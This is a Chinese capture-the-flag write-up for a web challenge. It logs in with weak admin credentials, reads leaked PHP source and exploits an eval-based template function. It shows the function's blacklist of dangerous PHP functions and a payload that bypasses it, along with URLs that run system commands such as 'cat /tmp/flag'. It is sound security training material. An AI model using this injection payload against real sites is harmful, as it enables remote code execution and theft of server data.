参考链接：http://skysec.top/2018/09/24/2018%E5%AE%89%E6%81%92%E6%9D%AF-9%E6%9C%88%E6%9C%88%E8%B5%9BWriteup/



[TOC]



# 题目链接

http://101.71.29.5:10000/web/index.php

# 解题思路

首先查看web页面，发现有几个按键。

![1538140258132](F:\学习资料\hacker\学习笔记\ctf\writeup\安恒杯\周周练18期\1538140258132.png)

依次查看，发现需要登陆，首先尝试爆破登陆。可以采用弱口令进行登陆。

弱口令：admin/admin123

登陆完成以后，再次查看每个页面。

- Backup

  

  ![1538142082277](F:\学习资料\hacker\学习笔记\ctf\writeup\安恒杯\周周练18期\1538142082277.png)

- ADD_IMG

  ![1538142193384](F:\学习资料\hacker\学习笔记\ctf\writeup\安恒杯\周周练18期\1538142193384.png)

根据backup页面的信息提示

```
You_Cant_Guess.zip

Flag in /tmp/flag 
```

首先将You_Cant_Guess.zip下载下来。发现里面有两个php文件

```
ContentController.php
SiteController.php
```

我们知道还有另一个页面，是添加图片的，我们找到添加图片页面使用到的代码段。

首先测试这个添加图片的页面如何工作，尝试添加一次

```
Name处输入test
Url处输入test
```

提交以后，页面将会以以下格式输出

```
图片内容为：
图片ID：542
图片名称:test
图片地址：test
```

根据上述提示，可以在ContentController.php文件中找到对应的代码

```
    public function actionShow(){
        $template = '<h1>图片内容为：</h1>图片ID：{cms:id}<br>图片名称:{cms:name}<br>图片地址：{cms:pic}';
        if (isset($_GET['id'])) {
            $model = new Content();
            $res = $model->find()->where(['id' =>intval($_GET['id'])])->one();
            $template = str_replace("{cms:id}",$res->id,$template);
            $template = str_replace("{cms:name}",$res->name,$template);
            $template = str_replace("{cms:pic}",$res->url,$template);
            $template = $this->parseIf($template);
            echo $template;
        }else{
            return json_encode(['error'=>'id error!']);
        }
```

通过分析代码，可以发现其中引用了parseIf功能来执行代码，对应的parseIf功能的代码如下：

```
    public function parseIf($content){
        if (strpos($content,'{if:')=== false){
            return $content;
        }else{
            $labelRule = $this->buildregx("{if:(.*?)}(.*?){end if}","is");
            $labelRule2="{elseif";
            $labelRule3="{else}";
            preg_match_all($labelRule,$content,$iar);
            foreach($iar as $v){
                $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v);
            }
            $iar = $iarok;
            $arlen=count($iar[0]);
            $elseIfFlag=false;
            for($m=0;$m<$arlen;$m++){
                $strIf=$iar[1][$m];
                $strIf=$this->parseStrIf($strIf);
                $strThen=$iar[2][$m];
                $strThen=$this->parseSubIf($strThen);
                if (strpos($strThen,$labelRule2)===false){
                    if (strpos($strThen,$labelRule3)>=0){
                        $elsearray=explode($labelRule3,$strThen);
                        $strThen1=$elsearray[0];
                        // $strElse1=$elsearray[1];
                        @eval("if(".$strIf."){\$ifFlag=true;}else{\$ifFlag=false;}");
                        if ($ifFlag){ $content=str_replace($iar[0][$m],$strThen1,$content);} else {$content=str_replace($iar[0][$m],$strElse1,$content);}
                    }else{
                        @eval("if(".$strIf.") { \$ifFlag=true;} else{ \$ifFlag=false;}");
                        if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],"",$content);}
                }else{
                    $elseIfArray=explode($labelRule2,$strThen);
                    $elseIfArrayLen=count($elseIfArray);
                    $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);
                    $resultStr=$elseIfSubArray[1];
                    $elseIfArraystr0=addslashes($elseIfArray[0]);
                    @eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}");
                    for($elseIfLen=1;$elseIfLen<$elseIfArrayLen;$elseIfLen++){
                        $strElseIf=$this->getSubStrByFromAndEnd($elseIfArray[$elseIfLen],":","}","");
                        $strElseIf=$this->parseStrIf($strElseIf);
                        $strElseIfThen=addslashes($this->getSubStrByFromAndEnd($elseIfArray[$elseIfLen],"}","","start"));
                        @eval("if(".$strElseIf."){\$resultStr=\"$strElseIfThen\";}");
                        @eval("if(".$strElseIf."){\$elseIfFlag=true;}else{\$elseIfFlag=false;}");
                        if ($elseIfFlag) {break;}
                    }
                    $strElseIf0=$this->getSubStrByFromAndEnd($elseIfSubArray[0],":","}","");
                    $strElseIfThen0=addslashes($this->getSubStrByFromAndEnd($elseIfSubArray[0],"}","","start"));
                    if(strpos($strElseIf0,'==')===false&&strpos($strElseIf0,'=')>0)$strElseIf0=str_replace('=', '==', $strElseIf0);
                    @eval("if(".$strElseIf0."){\$resultStr=\"$strElseIfThen0\";\$elseIfFlag=true;}");
                    $content=str_replace($iar[0][$m],$resultStr,$content);
                }
            }
            return $content;
```

根据这个函数的功能，之前有过一个漏洞是这个函数引起的问题。

参考文章，`https://www.anquanke.com/post/id/153402  `

那么我们这次添加图片为

```
Name处输入
test
Url处输入
{if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);die();//}{end if}

```

这次的输出页面为

![1538143044131](F:\学习资料\hacker\学习笔记\ctf\writeup\安恒杯\周周练18期\1538143044131.png)

给输出的url添加参数a和参数b

```
http://101.71.29.5:10000/web/index.php?r=content%2Fshow&id=543&a=system&b=ls
```

![1538143102722](F:\学习资料\hacker\学习笔记\ctf\writeup\安恒杯\周周练18期\1538143102722.png)

根据之前的页面提示，可以知道。flag位于/tmp/flag，那么我们构造url

```
http://101.71.29.5:10000/web/index.php?r=content%2Fshow&id=543&a=system&b=cat /tmp/flag
```

成功获取flag

```
flag{65bb1dd503d2a682b47fde40571598f4}
```

